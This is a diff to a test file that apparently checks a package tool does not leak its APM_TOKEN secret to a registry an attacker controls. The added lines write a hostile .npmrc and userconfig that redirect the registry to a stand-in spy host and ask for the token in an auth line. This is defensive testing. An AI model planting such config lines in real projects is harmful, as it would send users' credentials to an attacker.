@@ -204,13 +204,16 @@ describe("finding 2: APM_TOKEN only goes to the registry it was issued for", () 
 
   test("npm run's npm_config_userconfig, which a project .npmrc sets, does not decide where APM_TOKEN goes", async () => {
     // a project .npmrc with registry= and userconfig= reaches every npm run script as npm_config_registry and
-    // npm_config_userconfig (checked with npm 10.9.9 and 11.21.1): both name the attacker's host
+    // npm_config_userconfig (checked with npm 10.9.9 and 11.21.1): both name the attacker's host. The steered file and
+    // the project .npmrc also ask for ${APM_TOKEN} as the attacker's own auth line, which apm must not fill in.
     const spy = standIn();
     const sb = makeSandbox(reg, alice);
     const app = writeConsumer(work, reg);
     const steered = join(app, "evil-userconfig");
+    const askForToken = `${hostKey(spy.url)}:_authToken=\${APM_TOKEN}\n`;
 
-    writeFileSync(steered, `registry=${spy.url}\n`);
+    writeFileSync(steered, `registry=${spy.url}\n${askForToken}`);
+    writeFileSync(join(app, ".npmrc"), `registry=${spy.url}\nuserconfig=evil-userconfig\n${askForToken}`);
     const env = { ...laptopEnv(sb.env), APM_TOKEN: "apm_SECRET_CANARY_TOKEN_1234567890", npm_config_registry: spy.url, npm_config_userconfig: steered };
     const score = await apm(["score", "leakpkg"], { cwd: app, env });
 
